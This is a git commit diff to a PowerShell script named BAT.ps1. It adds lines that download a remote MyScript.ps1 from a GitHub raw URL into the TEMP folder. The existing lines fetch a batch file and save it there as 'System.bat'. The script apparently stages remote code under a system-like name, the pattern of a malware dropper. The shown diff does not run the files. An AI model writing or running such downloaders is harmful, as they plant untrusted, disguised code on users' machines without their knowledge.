a1e70b6fb0597a67e18ef0a27e035afeff348d7d
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-14 20:08:14 +0700

    Update BAT.ps1

--- BAT.ps1
+++ BAT.ps1
@@ -1,3 +1,6 @@
+$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
+$output1 = "$env:TEMP\MyScript.ps1"
+Invoke-WebRequest -Uri $url1 -OutFile $output1
 $url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
 $output4 = "$env:TEMP\System.bat"
 Invoke-WebRequest -Uri $url4 -OutFile $output4
